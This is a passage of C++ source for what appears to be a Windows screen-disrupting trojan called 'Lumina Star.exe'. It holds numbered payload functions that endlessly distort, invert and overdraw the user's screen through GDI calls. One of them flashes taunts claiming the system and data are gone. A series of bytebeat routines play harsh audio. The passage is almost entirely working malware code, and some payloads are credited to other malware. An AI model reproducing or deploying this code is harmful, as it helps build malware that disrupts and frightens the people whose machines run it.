	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload10_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	POINT pos[3];
	while (true)
	{
		hdc = GetDC(0);
		pos[0].x = 30, pos[0].y = -30;
		pos[1].x = w - 30, pos[1].y = 30;
		pos[2].x = -30, pos[2].y = h - 30;
		PlgBlt(hdc, pos, hdc, 0, 0, w, h, 0, 0, 0);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI Payload11_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	COLOR* data = (COLOR*)VirtualAlloc(0, (w * h + w) * sizeof(COLOR), MEM_COMMIT, PAGE_READWRITE);
	HBITMAP bmp = CreateBitmap(w, h, 1, 32, data);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				double fx = ((i >> 6) + (i * 9) * cbrt(((x + y * i) + i * 5) & ((i + y ^ i) - i * 7)) / 13);
				data[y * w + x].rgb += COLORHSV((w + h) + fx);
			}
		}
		i++;
		SetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		Sleep(1);
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload11_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), mmm = 90;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		for (int i = 0; i <= 24; ++i)
		{
			mmm++;
			BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
			for (int x = 0; x < w; ++x)
			{
				double range = (asin(cosf(x / 30.f * mmm)) * 80.f);
				BitBlt(hdcCopy, x, range, 1, h, hdcCopy, x, 0, SRCCOPY);
			}
			BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
			Sleep(100);
		}
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmp);
		Sleep(1);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0x00;
}
DWORD WINAPI Payload12_num2(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdc, bmp);
	LPCSTR texts[11] = {
		"Lumina Star.exe",
		"Seed.1081",
		"LambdaTechnology Studio",
		"LanPiaoPiaoFlyNB",
		"Your computer has been compromised by me, can't recovered.",
		"Want Meteofruit(SuperStar) reward?",
		"Goodbye, your system and data.",
		"It's very scary, isn't it?",
		"You can't move or breathe!",
		"MazeIcon is a skidder",
		"crzxyminty is fuking trash"
	};
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int rnd = rand() % 11;
		HFONT hFont = CreateFontA(rand() % 150, 0, rand() % 5033, 0, FW_EXTRABOLD, true, true, true, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "Frekoda");
		SelectObject(hdc, hFont);
		SetBkColor(hdc, RndRGB);
		SetTextColor(hdc, RndRGB);
		TextOutA(hdc, rand() % w, rand() % h, texts[rnd], strlen(texts[rnd]));
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hFont);
		Sleep(25);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload13_num1(LPVOID lpParam)//credits to WinMalware, but i modified it
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), i = 0, h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int bv = ((x + i) % 256) + 127;
				rgbquad[index].rgbRed = 1;
				rgbquad[index].rgbGreen = 1;
				rgbquad[index].rgbBlue = bv;
				if ((x ^ y & (x + y)) % 256 < 128) {
					rgbquad[index].rgbRed = 1;
					rgbquad[index].rgbGreen = (((x + i) ^ y) >> 16) ^ ((x + i) ^ y);
					rgbquad[index].rgbBlue = (((x + i) ^ y) >> 8) ^ (((x + i) ^ y) >> 16);
				}
			}
		}
		i += 2;
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 80, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0x00;
}
DWORD WINAPI Payload14_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	POINT pos[3];
	while (true)
	{
		hdc = GetDC(0);
		pos[0].x = 30, pos[0].y = -60;
		pos[1].x = w, pos[1].y = 30;
		pos[2].x = -30, pos[2].y = h + 30;
		PlgBlt(hdc, pos, hdc, 0, 0, w, h, 0, 0, 0);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI Payload14_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		POINT point[8] = { rand() % w,rand() % h,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h };
		int intttt[7] = { 2,3,4,5,6,7,8 };
		int intt[4] = { EDGE_BUMP ,EDGE_ETCHED ,EDGE_RAISED ,EDGE_SUNKEN };
		DWORD dworddddd[7] = { 2,3,4,5,6,7,8 };
		RECT rect = { w - rand() % w,rand() % h,2 * (rand() % (w / 2)),h - rand() % h };
		HPEN hpen = CreatePen(PS_SOLID, rand() % 20, RndRGB);
		HGDIOBJ hpenCopy = SelectObject(hdc, hpen);
		int rnddddd = rand() % 11;
		if (rnddddd == 0) { AngleArc(hdc, rand() % w, rand() % h, rand() % ((w + h) / 2), rand() % 360, rand() % 360); }
		else if (rnddddd == 1) { Arc(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h); }
		else if (rnddddd == 2) { ArcTo(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h); }
		else if (rnddddd == 3) { LineTo(hdc, rand() % w, rand() % h); }
		else if (rnddddd == 4) { PolyBezier(hdc, point, rand() % 8); }
		else if (rnddddd == 5) { DrawEdge(hdc, &rect, intt[rand() % 4], BF_RECT); }
		else if (rnddddd == 6) { Polyline(hdc, point, rand() % 8); }
		else if (rnddddd == 7) { DrawFocusRect(hdc, &rect); }
		else if (rnddddd == 8) { PolyBezierTo(hdc, point, rand() % 8); }
		else if (rnddddd == 9) { PolylineTo(hdc, point, rand() % 8); }
		else if (rnddddd == 10) { PolyPolyline(hdc, point, dworddddd, rand() % 8); }
		SelectObject(hdc, hpenCopy);
		DeleteObject(hpen);
		ReleaseDC(0, hdc);
		Sleep(50);
	}
	return 0;
}
DWORD WINAPI Payload15_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	POINT pos[3];
	while (true)
	{
		hdc = GetDC(0);
		pos[0].x = -30, pos[0].y = 30;
		pos[1].x = w - 30, pos[1].y = -30;
		pos[2].x = -30, pos[2].y = h + 30;
		PlgBlt(hdc, pos, hdc, 0, 0, w, h, 0, 0, 0);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdc, hbrush);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		SelectObject(hdc, hbrushCopy);
		DeleteObject(hbrush);
		ReleaseDC(0, hdc);
		Sleep(50);
	}
	return 0;
}
DWORD WINAPI Payload15_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		TRIVERTEX vtx1[4];
		vtx1[0].x = rand() % w; vtx1[0].y = rand() % h;
		vtx1[1].x = rand() % w; vtx1[1].y = rand() % h;
		vtx1[2].x = rand() % w; vtx1[2].y = rand() % h;
		vtx1[3].x = rand() % w; vtx1[3].y = rand() % h;
		vtx1[0].Red = rand() % 0xffff; vtx1[0].Green = rand() % 0xffff; vtx1[0].Blue = rand() % 0xffff; vtx1[0].Alpha = rand() % 0xffff;
		vtx1[1].Red = rand() % 0xffff; vtx1[1].Green = rand() % 0xffff; vtx1[1].Blue = rand() % 0xffff; vtx1[1].Alpha = rand() % 0xffff;
		vtx1[2].Red = rand() % 0xffff; vtx1[2].Green = rand() % 0xffff; vtx1[2].Blue = rand() % 0xffff; vtx1[2].Alpha = rand() % 0xffff;
		vtx1[3].Red = rand() % 0xffff; vtx1[3].Green = rand() % 0xffff; vtx1[3].Blue = rand() % 0xffff; vtx1[3].Alpha = rand() % 0xffff;
		GRADIENT_TRIANGLE gt;
		gt.Vertex1 = 0; gt.Vertex2 = 1; gt.Vertex3 = 2;
		ULONG mode[4] = { GRADIENT_FILL_TRIANGLE , GRADIENT_FILL_RECT_H, GRADIENT_FILL_RECT_V, GRADIENT_FILL_OP_FLAG };
		int rndmode = rand() % 3;
		if (rndmode == 0) {
			HRGN hrgn = CreateEllipticRgn(vtx1[0].x, vtx1[0].y, vtx1[1].x, vtx1[1].y);
			SelectClipRgn(hdc, hrgn);
			GradientFill(hdc, vtx1, 4, &gt, 1, mode[rand() % 4]);
			DeleteObject(hrgn);
		}
		else if (rndmode == 1) {
			HRGN hrgn = CreateRoundRectRgn(vtx1[0].x, vtx1[0].y, vtx1[1].x, vtx1[1].y, rand() % w, rand() % h);
			SelectClipRgn(hdc, hrgn);
			GradientFill(hdc, vtx1, 4, &gt, 1, mode[rand() % 4]);
			DeleteObject(hrgn);
		}
		else { GradientFill(hdc, vtx1, 4, &gt, 1, mode[rand() % 4]); }
		ReleaseDC(0, hdc);
		Sleep(50);
	}
	return 0x00;
}
DWORD WINAPI Payload16_num1(LPVOID lpParam)//from Hydrogen.exe by LeoLezury
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen = { 0 };
	HBITMAP bmp;
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		PRGBQUAD prgbTemp = { 0 };
		prgbTemp = prgbScreen;
		for (int i = 0; i < w * h; i++) {
			int randPixel = rand() % w, tempB = GetBValue(prgbScreen[i].rgb);
			prgbScreen[i].rgb = RGB(GetBValue(prgbScreen[randPixel].rgb), GetBValue(prgbScreen[randPixel].rgb), GetBValue(prgbScreen[randPixel].rgb));
			prgbScreen[randPixel].rgb = RGB(tempB, tempB, tempB);
		}
		Sleep(50);
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 80, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpCopy);
		Sleep(10);
		i++;
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0x00;
}
VOID WINAPI bytebeat1() {
	int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t ^ t >> 11 & t * (t >> 4 | t >> 5) >> (t >> 14)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat2() {
	int nSamplesPerSec = 16000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((tanf(t & 4096 ? t / 2 * (t ^ t % 255) | t >> 5 : t / 8 | (t & 8192 ? 4 * t : t)) * 129)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat3() {
	int nSamplesPerSec = 16000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((tanf((t * (t >> 10 & t >> 13)) / 40.75) * 129)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat4() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((~(t + (7 * t | (t >> 8) + (1 - (t >> 9)) * t + t >> 5 ^ t) ^ t) >> 3)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat5() {
	int nSamplesPerSec = 18000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((tanf(t % 125 & t >> 8 | t >> 4 | t * t >> 8 & t >> 8) * 129)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat6() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((((tanf(t * (((t >> 14) & 14) + (((t >> 5) | (t >> 7)) & 25))) * 129))))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat7() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((((((tanf(t - (t << 2 ^ t >> 8)) * 129))))))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat8() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((((((tanf(((8 * t) | (t >> 3)) + ((32 * t) & (t >> 2) | (t >> 7))) * 129))))))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat9() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((tanf(((t >> 5) ^ (t << ((t >> 2) % 4))) / 40.75)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat10() {
	int nSamplesPerSec = 8888, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((tanf(t * (0x32F376503 >> (t >> 13 & 27) & 127) | t >> 4 | t << 5) * 129))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat11() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((tanf(((2 * t) & (t >> 5) | (t >> 9) & (15 - t % (((t & 11451) != 0) ? 41 : 91) + 1)) / 30.75) * 129)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat12() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((tanf((t & 12 ^ 3 | (t >> 8)) * (t >> 2)) * 129))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat13() {
	int nSamplesPerSec = 12222, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((tanf(t & t ^ ~(1 - (t >> 9 & t >> 8)) & 6765) * 129))));
		((BYTE*)psSamples)[t] = bFreq;
	}
